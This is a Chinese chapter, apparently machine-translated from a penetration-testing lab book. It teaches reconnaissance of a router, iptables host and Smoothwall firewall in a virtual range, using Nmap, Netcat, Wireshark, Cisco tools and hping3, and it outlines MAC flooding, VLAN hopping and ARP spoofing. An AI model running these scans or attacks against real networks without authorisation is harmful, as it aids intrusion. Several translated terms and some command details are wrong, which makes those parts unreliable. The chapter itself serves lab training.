# 七、设备评估

在本章中，我们将学习评估不同类型设备的技术。在测试过程中，我们还将研究测试弱过滤器的方法。我们将讨论以下主题：

*   评估路由器
*   评估开关
*   攻击防火墙
*   识别防火墙规则
*   穿透过滤器的技巧

本章将为我们提供一种方法来评估哪些设备到位以及如何保护它们；发现我们要面对的管理员的技能水平是很重要的。一个经过强化且配置良好的环境将是一个重大挑战。然而，作为专业测试人员，我们的工作是接受挑战，看看我们能发现什么，并起草一份调查结果报告。

# 评估路由器

从外部攻击者的测试位置，我们将遇到的第一件事情很可能是路由器。有可能是一个设备，但由于我们主要是从建立测试范围的角度工作，因此我们不太可能随身携带设备。我们在书中早些时候展示了获取设备的位置；因此，如果你有这样的奢侈，你可以根据我们提供的信息建立你自己的固定实验室。

我们在最后一章中构建的外部体系结构是我们将要进行的所有测试的基础。我们的分层架构示例如下图所示：

![Assessing routers](graphics/477-1_07_01.jpg)

上图显示了我们的整个外部架构，我们遇到的第一件事就是路由器；因此，这是我们将使用的第一个设备来执行我们的测试。

正如我们过去在本书中所做的那样，我们希望专注于我们将在给定时间点处理的架构领域；因此，在本节中，我们将重点关注的体系结构如下图所示：

![Assessing routers](graphics/477-1_07_02.jpg)

要准备此测试，请为路由器和 Kali Linux 发行版启动虚拟机。我们将使用 Kali 对路由器进行测试。机器开机后，使用您创建的所需用户名和密码登录这两台机器。

在路由器机器中，您必须启动路由器，打开终端窗口，然后输入`dynamips –H 7200`启动路由器。一旦启动，您需要通过打开另一个终端窗口并输入`dynagen config.net`来加载配置文件。配置加载后，输入`console R1`并访问正在运行的路由器，在路由器提示下输入`en`在路由器上进入特权模式。此时，我们输入`show ip int brief`以显示路由器接口的配置。输出应类似于以下屏幕截图所示：

![Assessing routers](graphics/477-1_07-3.jpg)

与之前一样，我们希望确保我们的接口处于线路和协议`up`的状态，如前一个屏幕截图所示。一旦我们确定了这一点，我们将把注意力转向其他事项。

在 Kali 分布中，当我们对我们的范围进行测试时，我们可以使用许多工具；其中最流行的是网络映射工具 Nmap。打开 Kali 上的终端窗口，对连接到 VMnet8 的路由器接口进行扫描；如果您已将您的机器配置为与我们在本书中使用的匹配，则您将输入`nmap -sS 192.168.177.10 –n`进行扫描。

这将对目标进行 SYN 或半开放扫描，在这种情况下，目标是路由器的 f0/0 接口。`n`选项告诉 Nmap 不要进行名称查找，并帮助我们更快地完成扫描。

以下屏幕截图显示了此扫描结果的示例：

![Assessing routers](graphics/477-1_07-4.jpg)

对于阅读本文的读者来说，您很可能知道我们有 65536 个可能的端口，而工具 Nmap 在扫描中只查看了 1000 个端口。这是 Nmap 的默认设置，因此我们可以将其更改为扫描所有端口，现在我们将这样做。输入`nmap -sS –p 0-65535 192.168.177.10 –n`扫描所有可能的端口。如果发现的服务是要攻击的服务，则可以跳过对整个端口范围的扫描。

此扫描需要很长时间才能完成；您可以随时按空格键获得实时更新。

一旦这个很长的扫描完成，路由器上将只有一个端口打开，因此，这是我们针对路由器本身的一个攻击向量。以下屏幕截图显示了进行到一半时的扫描示例：

![Assessing routers](graphics/477-1_07-5.jpg)

正如前面的截图所示，扫描需要很长的时间才能完成，我们尤其不喜欢这样的事实，即所花费的总时间正在增加。这是因为扫描必须向所有 65536 端口发送数据包。有一些方法可以加快扫描速度，但我们在这里不担心这一点。由于路由器上只有一个端口是开放的，因此，这是攻击的一个向量，我们可以连接到它，看看会有什么响应。

重要的是要注意，这只是路由器的默认配置，没有发生硬化或任何事情；然而，我们确实没有太多的攻击面需要处理。我们的优势在于，这是 Cisco 软件的旧 IOS 版本，这可能有助于我们前进，但我们将首先尝试一些基本的东西。由于 telnet open 有一个端口 23，因此我们可以连接到它并查看连接结果。在 Kali 上的终端窗口中，输入`telnet 192.168.177.10`连接路由器上的 telnet 服务；以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-6.jpg)

好消息是有一个服务正在端口上运行，我们可以连接到它；坏消息是，密码从未设置，因此，我们无法长时间访问该端口。连接端口的另一种方法是使用工具 Netcat，我们现在将尝试一下，看看结果是否有任何差异。在终端窗口中，输入`nc 192.168.177.10 23`使用 Netcat 工具连接到服务，看看我们是否有更好的运气；以下屏幕截图显示了结果示例：

![Assessing routers](graphics/477-1_07-7.jpg)

再一次，我们并没有得到任何有价值的东西，所以我们转向另一种方法。首先，我们需要意识到我们是在欺骗，因为我们知道只有一个虚拟路由器。当然，当你做一个实际的测试时，情况并非如此；因此，我们需要了解如何确定我们正在处理的是路由器。要做到这一点，我们必须在数据包级别查看网络流量。

### 注

任何时候我们想知道我们在处理什么，总是从数据包的层面来看待它。幸运的是，Kali 发行版中包含了一个很棒的工具，那就是 Wireshark。

在 Kali 中打开终端窗口，输入`wireshark &`启动工具。当工具出现时，在连接到 VMnet8 交换机的接口上启动捕获，该接口应为 eth0。以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-8.jpg)

一旦验证了您的设置，点击**开始**在 eth0 界面上开始捕获。一旦捕获开始，对路由器进行另一次扫描，并在 Wireshark 中查看结果。以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-9.jpg)

如前一个屏幕截图所示，这是一个具有访问控制列表的路由器；任何时候，当您看到消息通信经过管理过滤后无法到达 ICMP 目的地时，您就知道您将遇到一个路由器。以下屏幕截图显示了 ACL 扫描的示例：

![Assessing routers](graphics/477-1_07-10.jpg)

那么，我们现在该怎么办？我们知道有一个路由器，它有一个访问控制列表。您还将注意到，现在返回的结果将有一个 ACL，并且只显示一个端口处于关闭状态。我们的电话网去哪里了？telnet 端口已打开，因为该路由器上没有 ACL，但一旦应用 ACL，规则将设置为默认拒绝，因此，您将看到打开的所有内容都是管理员明确允许的。

这就是测试的现实。幸运的是，这位管理员没有阻止 ICMP 回复消息，因此我们至少可以确定我们有一个路由器。我们可以尝试的下一件事是看看 Nmap 告诉我们的关于路由器的信息。

使用 Nmap 工具，我们可以尝试进行枚举扫描。要做到这一点，我们可以使用`–A`选项，所以我们现在就尝试一下。在终端窗口中，输入`nmap –A 192.168.177.10`命令，查看我们可以从路由器收集到什么。以下屏幕截图显示了此扫描结果的示例：

![Assessing routers](graphics/477-1_07-11.jpg)

事实证明，即使是枚举扫描也没有多大帮助。这是因为路由器没有为工具提供太多帮助。同样，我们知道我们将遇到一个路由器，这就是为什么我们开始使用它。我们看到端口 80 报告正在关闭，因此让我们进一步调查。无论何时进行测试，都需要维护的一件重要事情是捕获 Wireshark 中的流量，并查看目标在数据包级别的响应。

因为我们知道我们有一个端口 80 响应，所以我们可以使用它作为下一次获取信息的尝试。在您的终端窗口中，输入`nmap –sS –p 80 192.168.177.10`将扫描指向提供响应的端口；在 Wireshark 显示屏中，您可能需要设置一个过滤器`tcp.port == 80`，以集中于我们发送的流量。以下屏幕截图显示了一个结果示例：

![Assessing routers](graphics/477-1_07-12.jpg)

显示 Wireshark 显示的屏幕（剪切的文本不重要）

这表明，当我们连接到端口 80 时，我们得到一个 RST 和 ACK 数据包；这意味着该港口已根据**征求意见**（**RFC**关闭。在我们继续之前，有一个关于 RFC 的字：如果你想掌握测试的艺术，特别是在数据包级别，你需要熟悉它们；然而，正如你们中的许多人在读这篇文章时很可能知道的那样，他们读起来并不激动人心。一个可以帮助你了解 RFC 信息的网站是网络巫术网站；它提供了关于所有协议和其他网络数据的优秀信息，强烈建议您在不确定某项功能如何工作时花些时间进行检查。您可以在[找到该网站 http://www.networksorcery.com/](http://www.networksorcery.com/) 。

您希望关注的领域是 RFC 原始资料；以下屏幕截图显示了信息示例：

![Assessing routers](graphics/477-1_07-13.jpg)

好的，是时候回到手头的任务了。为什么 Nmap 只显示端口 80，而没有其他端口关闭？我们使用 Wireshark 来确定当向端口发送 SYN 数据包时，该端口使用 RST 和 ACK 标志进行响应，那么接下来我们该怎么做？

在这里，我们可以尝试其他一些方法来查看对端口的响应。我们知道港口报告为关闭状态；那么，让我们试试 HTTPS 端口，看看会得到什么样的响应。在 Wireshark 筛选器中，输入`tcp.port == 443`，重新启动数据包捕获也是一个好主意。导航到**捕获****重新启动**以清理您收集的所有流量。在终端窗口中，输入`nmap –sS –p 443 192.168.177.10`探测 HTTPS 端口 443。扫描完成后，记录结果。以下屏幕截图显示了一个结果示例：

![Assessing routers](graphics/477-1_07-14.jpg)

正如您在前面的屏幕截图中所看到的，端口不是在关闭状态下报告的，而是在过滤状态下报告的；为什么不同？首先，让我们看看 Wireshark 中的结果。Wireshark 的结果示例如以下屏幕截图所示：

![Assessing routers](graphics/477-1_07-15.jpg)

正如我们从前面的屏幕截图中看到的，现在目标没有响应，这就是为什么 Nmap 将其报告为已过滤；因此，我们看到端口 80 生成响应，而端口 443 不生成响应，这告诉我们端口 80 流量有某种形式的规则，而端口 443 流量没有。这些是我们应该记录的东西，这样当我们再次看到它时，我们就知道发生了什么。

我们还有一次尝试，然后我们将继续尝试并获得更多的结果来对抗路由器。根据 RFC 793，当端口发送包含非法标志组合的数据包时，如果它是打开的，则不应响应，如果它是关闭的，则应使用设置了 RST 标志的数据包进行响应。我们现在就尝试一下。在终端窗口中，输入`nmap –sX –p 80 192.168.177.10`向端口发送非法标志包；在这个案例中，这是圣诞树扫描。扫描完成后，再次对端口 443 进行相同的扫描；输入`nmap –sX –p 80 192.168.177.10`并比较结果。以下屏幕截图显示了结果示例：

![Assessing routers](graphics/477-1_07-16.jpg)

那么，我们能够确定什么？从前面的屏幕截图中，我们看到用作路由器的机器似乎遵循 RFC 793；这有助于减少可能的设备，因为某些供应商（如 Microsoft 和 OpenBSD UNIX）不遵循 RFC。我们还可以假设，由于市场上大多数路由器都运行 Cisco 路由器，这可能就是我们要处理的问题。不幸的是，到目前为止，我们真的不太了解设备的风格，但我们知道它运行一个 ACL，其中有一个端口 80 的规则。

我们已经用尽了 Nmap 扫描选项，直接针对路由器接口。当我们通过设备时，我们将尝试更多的工具；现在，我们将只测试设备，当然，记录结果。

在进入下一步之前，我们还有一件事要做，那就是验证我们的假设。当我们用 Nmap 扫描时，端口 80 显示为关闭，当我们尝试端口 443 时，我们得到一个过滤报告。我们假设这是因为 ACL 中必须为端口 80 制定一些规则。好吧，我们从不想假设，我们想确保我们的假设是正确的；因此，我们最好的选择是为另一个端口添加一个规则，看看会发生什么。我们现在就做。在路由器中，输入以下命令：

```
conf t
ip access-list extended External
permit tcp any any eq 22

```

按*Ctrl*+*Z*，然后输入以下命令：

```
show access-lists

```

以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-17.jpg)

正如前面的屏幕截图所示，我们现在有一个规则，允许我们的端口 80 流量以及端口 22 流量。值得注意的是，由于我们刚刚进入规则，因此没有与其他规则匹配的规则。

我们现在准备检验我们的理论。在您的 Kali 分发中，在终端窗口中输入`nmap 192.168.177.10 –n`以使用 Nmap 进行默认扫描。如前所述，`n`选项有望加快扫描速度。扫描结束后，检查结果；以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-18.jpg)

任务成功！我们现在已经证明，当路由器（在本例中为 Cisco 路由器）为某个端口设置了规则时，它将响应该端口。我们现在得到的信息是，在这种情况下，有两个端口是开放的；因此，我们有两个潜在的向量为我们的攻击提供访问路由器的途径。我们现在准备继续，并尝试找到攻击路由器设备的方法。

由于 Kali 发行版是一个渗透测试工具包，而且很可能以前有人遇到过 Cisco 路由器，因此我们可以求助于它，看看它可能有什么帮助我们继续测试路由器。事实上，思科发行版中不仅有工具，而且还有自己的菜单项！

在 Kali Linux 中，导航到**应用****Kali Linux****漏洞分析****Cisco 工具**，并显示适用于 Cisco 路由器的发行版中可能包含的工具。以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-19.jpg)

屏幕显示思科路由器发行版中可能包含的工具（裁剪文本不重要）

正如前面的屏幕截图所示，当我们遇到 Cisco 设备时，可以使用许多工具。从这里开始，这主要是一个实验的问题，或者我们喜欢说的，反复试验。

最好从顶部开始，所以我们现在来看看第一个工具，思科审计工具。选择后，将打开一个窗口并提供该工具的选项，如以下屏幕截图所示：

![Assessing routers](graphics/477-1_07-20.jpg)

当您查看该工具的输出时，它实际上没有多大帮助；运行工具的命令在哪里？不幸的是，这种情况有时会发生在 Kali Linux 发行版中。如果我们运气好的话，我们至少会在目录里，这样我们就能找到答案。在终端窗口中，输入`ls`后接`pwd`显示我们所在的目录，如下图所示：

![Assessing routers](graphics/477-1_07-21.jpg)

当你回顾之前的屏幕截图和工具输出时，你运气好吗？不，似乎菜单没有把我们放在正确的目录中，它把我们放在了`root`目录中。那么，我们现在该怎么办？好吧，我们可以尝试一些选择，但目前我们不会在这些选择上花费太多时间；我们只看一对。这是 Linux，所以我们可以尝试主页；我们现在就做。在终端窗口中，输入`man cisco-auditing-tool`查看是否有主页可用。我们可能可以使用更好的命令名来查找它，但实际上我们没有太多的工作要做，所以我们将只尝试几个选项。以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-22.jpg)

好的，正如前面的截图所示，我们在这里做得不是很好，这就是我们将经历这个过程的原因，因为通常情况就是这样。那么，我们现在该怎么办？嗯，是时候引入互联网了，在搜索互联网之后，我们发现 Kali Linux 中的工具使用了`CAT`文件。所以，我们现在就来试试。在终端窗口中，输入`CAT`查看发生了什么。

以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-23.jpg)

最后，正如前面的屏幕截图所示，我们找到了该工具的命令。当我们回顾这些选项时，我们发现第一个选项适用于单个主机；所以，既然我们有一个目标设备，我们就从它开始。我们将进入`CAT –h 192.168.177.10`并观察输出。以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-24.jpg)

从上一个屏幕截图的输出可以明显看出，该工具寻找打开 telnet 端口 23，因此我们知道情况并非如此。但是，我们可以将此工具记录为一个工具，以便在 telnet 打开时重新访问。

我们现在将继续尝试另一种工具。这是我们测试的过程；我们想看看所有不同的工具和方法，以实现我们测试的目标；因此，您必须记录哪些是有效的，哪些是无效的，因为这将在您违背实际目标时为您节省大量时间。

我们将看到的下一个工具，也是列表中的下一个工具，是 Cisco global Explorer。以下屏幕截图显示了此工具的选项示例：

![Assessing routers](graphics/477-1_07-25.jpg)

当我们查看该工具的选项时，我们发现大多数选项都要求 web 服务器或 telnet 服务可用。既然我们知道情况并非如此，我们可以继续下一个选项。但是，请记住记录工具需求，以便您可以在其他时间对其进行测试。我们可以关闭访问列表，然后打开测试选项。但是，在大多数情况下，管理员不会启用这些功能，默认情况下也不会启用这些功能。他们过去是这样，但和安全领域的大多数事情一样，他们已经加强了这一点，现在不再是这样了。

我们可以继续尝试不同的工具，但我们会为您节省时间。当我们扫描路由器时，我们无法找到关于它的很多信息，因此 ACL 几乎阻止我们发现很多信息。因此，为了证明这一点，我们现在将删除 ACL，看看它是否对我们有帮助。在 Cisco 路由器中，输入以下命令：

```
conf t
int f0/0
no ip access-group External in

```

按*Ctrl*+*Z*，然后执行以下命令：

```
show ip int f0/0

```

我们要验证 ACL 是否不再位于接口上。以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-26.jpg)

现在我们已经清除了 ACL，我们可以尝试使用 Nmap 进行另一次扫描。我们可以做一个正常的默认扫描，但我们将从枚举扫描开始；因此，在 Kali Linux 的终端窗口中，输入`nmap –A 192.168.177.10 –n`并扫描目标。下一个屏幕截图显示了一个结果示例：

![Assessing routers](graphics/477-1_07-27.jpg)

哇！这真是太不一样了！现在，如果我们可以让我们的目标没有配置 ACL，我们可以发现关于目标的大量信息，但是您很可能会遇到 ACL，那么您如何处理它呢？嗯，在最初的发现中，你可以询问信息，他们可能会提供信息。你也可以在不同的地点尝试；虽然保护外部接口非常常见，但保护内部接口的情况要少得多。因此，在某些情况下，这将是继续进行的最佳选择。

从这里，您将注意到不同的结果，然后记录哪些有效，哪些无效；此外，您将注意到可以进行的不同配置更改，以及这些更改如何影响结果。事实上，您现在应该运行 Kali 中的所有工具，看看没有 ACL 有什么区别；一如既往，记录你的发现。

如果我们发现有什么事情发生，我们总是可以攻击路由器，但更重要的是，事实上，路由器是内部的一个保护装置，我们前进的方向是看看如何通过路由器；这是我们在本章后面要做的。现在，我们想讨论当我们遇到使用 Linux 机器或其他设备作为路由器和过滤设备的人时，结果是什么。

由于我们已经对作为外围设备可能遇到的路由器做了大量的工作，因此当我们遇到使用 iptables 作为路由器的环境并提供 ACL 功能时，是时候看看结果了。为此，我们需要打开我们在[第 4 章](04.html "Chapter 4. Identifying Range Architecture")*识别范围架构*中配置 iptables 的虚拟机。您可能希望挂起我们一直用作路由器的计算机，以避免冲突和系统资源。在本章后面，我们将重新讨论机器和路由器设备。

一旦您的虚拟机启动，使用所需的凭据登录并打开终端窗口。在终端窗口中，输入`iptables –L`显示当前配置，如下图所示：

![Assessing routers](graphics/477-1_07-28.jpg)

我们看到我们有一个 http 通信的规则集，所以现在我们知道我们想要使用我们的 Kali Linux 机器扫描机器。在您的 Kali Linux 机器中，打开终端窗口并输入`nmap 192.168.177.15`以扫描 iptables eth0 接口。下一个屏幕截图显示了此扫描结果的示例：

![Assessing routers](graphics/477-1_07-29.jpg)

从前面显示扫描结果的屏幕截图中，我们知道 ssh 和端口 111 已打开。这与我们扫描路由器时有显著的不同，因为 iptables 正在机器上运行；因此，结果将显示机器上打开的内容。这为我们提供了一些攻击途径，但问题是我们没有对 iptables 规则进行真正的测试。这是因为我们不关心 iptables 规则；此扫描仅扫描机器的界面，与我们的 iptables 规则无关。有了路由器，我们就有了一个可以扫描的接口。因为我们这里没有，我们只扫描机器；但这是一个很好的方法来确定您将遇到一台充当路由器的机器还是一个实际的路由器设备。

那么，我们现在该怎么办？嗯，我们有两个选择。由于 ssh 是开放的，我们可以尝试强制它，或者如果我们知道已经打开了端口，它将帮助 Nmap 在枚举方面做得更好。所以，我们现在就来试试。在终端窗口中，输入`nmap –A 192.168.177.15`进行枚举扫描。

以下屏幕截图显示了该输出的一部分示例：

![Assessing routers](graphics/477-1_07-30.jpg)

显示部分输出示例的屏幕（剪切的文本不重要）

从上一个屏幕截图中，我们看到我们确实有其他信息。同样，这是因为我们只是在查看 iptables 所在的机器，而不是规则。为了让 iptables 规则参与进来，我们可以做一些事情，但我们将在本章后面的部分中保留这些内容。根据我们在这里看到的，我们还能做些什么吗？答案是肯定的。我们看到我们有 OpenSSH 版本，因此我们可以使用本书中讨论的技术，并尝试查找此版本 SSH 可能存在的任何漏洞。我们可以在互联网上搜索。在撰写本文时，有几处提到版本 6.0 存在一些拒绝服务漏洞，但由于渗透测试工作范围中很少要求这样做，我们将不在这里讨论这些漏洞，欢迎您自己进行实验。

在继续之前要做的最后一件事是查看数据包级别的流量。在 Kali Linux 的终端窗口中输入`wireshark &`启动 Wireshark 工具。当工具打开时，通过导航到**eth0****捕获**在您的 eth0 界面上开始捕获。捕获开始后，在另一个终端窗口中运行 Nmap 扫描，然后在 Wireshark 中查看结果。因为我们真的只是想看看是否有任何消息显示我们在过滤器中遇到的，所以您可以输入一个显示过滤器。我们现在就做。在筛选器窗口中，输入`icmp`查看目标是否发送了 ICMP 通信。

下面的屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-31.jpg)

显示目标是否发送任何 ICMP 通信的屏幕（剪切的文本不重要）

上一个屏幕截图确实显示了一些 ICMP，但您会注意到，如果安装了过滤器，这些都不是我们会看到的 ICMP 类型。数据包 1702 是根据 RFC 对关闭的**用户数据报协议**（**UDP**端口的响应。

我们还有一个过滤器，我们将应用于结束这一部分。作为测试人员，我们尽可能快地获取数据是很重要的，这就是 Wireshark 过滤器的威力所在。然而，在我们这样做之前，我们是否错过了什么？希望您能记住，默认情况下 Nmap 只扫描 1000 个端口，因此，我们不会扫描所有端口。您可能已经扫描了端口；作为提醒，我们使用`-p`选项进行端口扫描，您应该扫描所有端口，以便您的测试结果更加完整。完成扫描后，Wireshark 中会有几个数据包需要查看。因此，为了简化我们的工作，请在 Wireshark 的“过滤器”窗口中输入以下内容：

```
tcp.flags.syn == 1 and tcp.flags.ack == 1

```

输入过滤器后，点击**应用**应用过滤器。现在，将显示设置了 SYN 和 ACK 标志的所有数据包；因此，您现在可以快速参考目标上打开的端口。以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-32.jpg)

显示目标上打开的端口的快速参考的屏幕（剪切的文本不重要）

如果您希望查看端口号，而不是通常分配给该端口的协议名称，您可以在 Wireshark 的设置中对此进行更改。导航到**编辑****首选项****名称解析**并删除**解析传输名称**下的复选标记。以下屏幕截图显示了一个示例：

![Assessing routers](graphics/477-1_07-33.jpg)

这就是我们现在使用 iptables 机器所要做的。正如我们提到的，当我们实际开始针对规则集进行测试时，我们将重新讨论这个问题。我们可以用路由器设备来实现这一点，但我们将结合使用 iptables 机器通过路由器 ACL 进行的测试来实现这一点。

# 评估开关

我们最有可能遇到的另一个设备是交换机。由于交换机是单播设备，只向所有端口发送广播流量，当我们遇到这样的情况时，我们希望尝试创建一种情况，即交换机要么将数据包错误地转发到我们希望的错误目的地，要么让交换机向所有端口发送所有信息，实际上成为一个集线器。

我们要研究的攻击称为第二层攻击。诚然，在**开放系统互连**（**OSI**模型）的第七层，确实有一些交换机一直在运行，但我们将重点关注在第二层运行的更传统的方法。

## MAC 攻击

在数年的时间里，我们享受着能够使用名为**macof**的优秀工具对开关进行洪水淹没的奢侈。您可以在[上了解更多信息 http://linux.die.net/man/8/macof](http://linux.die.net/man/8/macof) 。使用 macof 工具，您可能仍然取得了一些成功，但它通常只在您遇到 2006 年之前的切换时起作用。我们想让交换机洪水泛滥，将其变成一个集线器，这样我们就可以拦截潜在攻击的流量。

如果您遇到较旧的开关，macof 可以在 70 秒内溢出平均**内容可寻址内存**（**CAM**表）。由于遇到较旧的开关是很常见的，因此至少要了解该工具的使用方式。我们在 Kali Linux 发行版中提供了 macof 工具。在 Kali 机器中，导航到**应用****Kali Linux****压力测试****网络压力测试****macof**打开 macof 工具，如下图所示：

![MAC attacks](graphics/477-1_07-34.jpg)

这将打开 macof 工具，正如在 Kali Linux 发行版中常见的那样，有一个显示工具使用情况的输出。以下屏幕截图显示了工具的使用示例：

![MAC attacks](graphics/477-1_07-35.jpg)

正如前面的屏幕截图所示，该工具的使用非常简单。同样，当您遇到较旧的开关时，可以使用此工具。我们现在来看第二层对交换机的另一次攻击。

## VLAN 跳转攻击

我们将研究的下一个攻击是跨 VLAN 跳转的技术。许多管理员在配置交换机时会出错，因此，我们有时会跳过 VLAN。我们使用 VLAN 跃点来访问分配给主机的 VLAN 不可用的资产。

在 VLAN 跃点中，我们利用了主干可以访问所有 VLAN 这一事实。为了实施攻击，我们必须使用中继协议信令欺骗交换机。要使其工作，必须对交换机进行配置，以允许我们完成此任务。默认设置为**自动**，这将允许我们的攻击工作。如果欺骗有效，我们将可以访问网络上的所有 VLAN。

## 加普攻击

**免费地址解析协议**（**GARP**攻击针对的是 ARP 没有身份验证，因此可以成功欺骗 ARP 地址。过程是发送一个发送到广播地址的 GARP，一些操作系统将覆盖现有的 ARP 条目，即使该条目已静态输入。

所有这些攻击都是可能的，但除非我们建立一个实际的静止靶场，否则我们将无法在大部分靶场上构建和测试它们。

# 攻击防火墙

接下来，我们要攻击防火墙，就像我们之前遇到路由器时所做的那样。我们的成功与否将取决于管理员以及他们如何配置环境。

我们将使用我们创建的**Smoothwall**防火墙，并从连接到 VMnet2 交换机的红色接口对其进行攻击。我们将使用与针对路由器相同的过程，并查看当我们针对防火墙时可以发现什么。我们的测试范围如下图所示：

![Attacking the firewall](graphics/477-1_07_36.jpg)

如上图所示，我们将只关注 Smoothwall 机器的外部接口。我们想做的第一件事是使用我们流行的网络扫描工具 Nmap，看看我们能从机器上发现什么。

我们需要将 Kali Linux 发行版连接到 VMnet2 交换机。以下屏幕截图显示了一个示例：

![Attacking the firewall](graphics/477-1_07-37.jpg)

一旦您在 Kali 机器中验证了您的设置，请登录并在您的 Smoothwall 机器中输入`ifconfig eth0`以显示机器的 IP 地址信息，因为我们需要将此信息输入到我们的工具中。以下屏幕截图显示了一个示例：

![Attacking the firewall](graphics/477-1_07-38.jpg)

现在我们已经有了 IP 地址，可以开始扫描了。在您的 Kali Linux 机器中，输入`nmap –A 10.2.0.131`扫描 Bastion 主机的 eth0 接口。如果您的 IP 地址不同，则您将输入该地址作为目标。以下屏幕截图显示了部分结果的示例：

![Attacking the firewall](graphics/477-1_07-39.jpg)

再一次，我们真的没有太多事情要做。我们看到机器上只有一个打开的端口，而且由于 Nmap 工具没有足够的端口来尝试操作系统的指纹，我们需要查看数据包级别。通过输入`wireshark &`在 Kali 上启动 Wireshark，并在 eth1 接口上启动数据包捕获。启动数据包捕获后，再次运行 Nmap 扫描，然后在 Wireshark 中查看扫描。

以下屏幕截图显示了部分扫描的示例：

![Attacking the firewall](graphics/477-1_07-40.jpg)

显示部分扫描示例的屏幕（剪切的文本不重要）

当您查看上一个屏幕截图时，您会看到**标识**端口确实响应为关闭。实际上，所有其他端口都没有响应，所以至少我们还有一些事情要做。这是因为如果存在 Internet 连接，则注册 Smoothwall 安装，并且通过端口 113 控制标识。

当我们阅读本章时，我们在扫描路由器时发现了一件事；这是 ICMP 错误消息的使用，因此我们希望查看 Smoothwall 计算机是否返回任何 ICMP 消息。从新捕获开始总是一个好主意，因此在 Wireshark 中，导航到**捕获****重新启动**在界面上启动新捕获。为了简化您的任务，请输入 ICMP 的筛选器并单击**应用**。然后，返回终端窗口，再次运行 Nmap 扫描，并在 Wireshark 中观察结果。

以下屏幕截图显示了一个结果示例：

![Attacking the firewall](graphics/477-1_07-41.jpg)

我们确实有 ICMP 流量，这可以帮助我们确定是否会遇到防火墙。接下来，我们想知道哪个端口响应 ICMP 消息。我们知道，根据 RFC 793，这是对已关闭的 UDP 端口的有效响应。因此，我们需要确定这是一个响应的 UDP 端口，还是一个 TCP 端口。我们将再次运行扫描，只查看 TCP 流量，并在扫描过程中输入`nmap –sS 10.2.0.131`并观察 Wireshark。以下屏幕截图显示了一个结果示例：

![Attacking the firewall](graphics/477-1_07-42.jpg)

显示结果示例的屏幕（剪切的文本不重要）

从前面的屏幕截图中，我们看到 TCP 端口导致响应，因此它不遵循 RFC。我们现在可以得出结论，我们有一个防火墙，我们可以尝试攻击它或通过它。

这又是现实的考验；我们可以找到一个防火墙，除非我们对防火墙有所了解，否则成功地攻击它即使不是不可能，也是很困难的。在这种情况下，如果我们没有知道这是 Smoothwall 防火墙的优势，我们将几乎不知道我们遇到了什么类型的防火墙。

欢迎您继续尝试获取有关防火墙的信息，以便您可以攻击它，但我们将继续，因为与 Smoothwall 防火墙合作多年后，发现通过它的方法或使用某种形式的社会工程来访问它要容易得多。

# 识别防火墙规则

在本章中，我们之前确定了路由器的哪个端口有规则；这是一种您希望在您的范围内继续练习的技术，但我们尚未专门研究防火墙本身。如果我们想成功通过防火墙，我们需要看看防火墙允许和阻止了什么。正如前面提到的一样，这可能是一个重大的挑战，而且通常情况下，我们仅限于使用开放的端口来通过防火墙。

我们提到路由器是无状态防火墙的一种形式，并且我们展示了应用了 ACL 的路由器的 Nmap 扫描将显示具有规则集的端口。我们不仅讨论了它，而且还继续证明了它。我们将更进一步，首先使用路由器，然后使用 iptables 和 Smoothwall 防火墙。

我们想看看允许哪些流量通过无状态防火墙。因为我们已经在前面的扫描中完成了这项工作，所以我们将简单地看一下测试规则的另一种方法。我们将使用本节中以下屏幕截图所示的设计：

![Identifying the firewall rules](graphics/477-1_07_43.jpg)

正如前面的屏幕截图所示，我们有第二个网络，由 VMnet2 交换机表示，因此启动所需的机器并登录到它们。在路由器计算机中，打开一个终端窗口并输入以下命令以使 dynamips 计算机运行：

```
dynamips –H 7200
dynagen config.net

```

### 注

确保为每个命令打开一个终端窗口，并导航到`/opt`目录。

路由器启动后，输入以下命令：

```
console R1
en
show ip int f0/0

```

如图所示验证您的设置。界面上有一个访问列表；如果没有，你就得穿上。我们在本章前面介绍了这些步骤，以防您需要帮助。以下屏幕截图显示了一个示例：

![Identifying the firewall rules](graphics/477-1_07-44.jpg)

从上一个截图中我们看到在这个界面上有一个 ACL，所以我们准备做一些测试。我们要做的第一件事是验证我们的路由。如果没有设置，那么我们需要创建路由。同样，这是我们已经做过的事情，因此我们将不在这里介绍这些步骤。

### 注

您必须在 Kali 机器和 OWASP 机器上设置路由。

如果设置了路由，您应该能够访问**OWASP**机器的 web 服务器。使用 Netcat 或 telnet 验证是否可以连接到机器；在这里，我们将使用 Netcat。在 Kali Linux 机器中，在终端窗口中输入`nc 10.3.0.132 80`并验证您可以连接到端口；如果成功，则路由已配置并正常工作。连接后，请输入以下内容：

```
GET / http/1.1

```

以下屏幕截图显示了一个示例：

![Identifying the firewall rules](graphics/477-1_07-45.jpg)

一旦路由设置完毕，我们就可以开始测试规则了。我们将从 Nmap 扫描开始。输入`nmap 10.2.0.132`并查看结果；我们现在将扫描整个路由器，以便 ACL 发挥作用。以下屏幕截图显示了一个结果示例：

![Identifying the firewall rules](graphics/477-1_07-46.jpg)

从上一个屏幕截图中，我们看到，由于我们现在正在跨越 ACL，我们实际上得到了允许通过无状态防火墙的端口的结果。我们将再看一个，然后继续测试其他的。我们也可以使用工具**Hping**查看规则。在 Kali 上的终端窗口中，输入`hping3 –S –p 80 10.2.0.132`并记录结果。现在，我们要输入一个我们知道未打开的端口的命令。输入`hping3 –S –p 22 10.2.0.132`并记录结果。以下屏幕截图显示了一个示例：

![Identifying the firewall rules](graphics/477-1_07-47.jpg)

根据我们所看到的，很容易确定无状态过滤器的规则，但是实际的防火墙呢？我们首先来看 iptables 的反应。关闭或挂起路由器，并启动 iptables 计算机。

### 注

我们必须调整路由以指向正确的接口，如果 iptables 机器中没有 IP 转发，我们还必须启用 IP 转发。

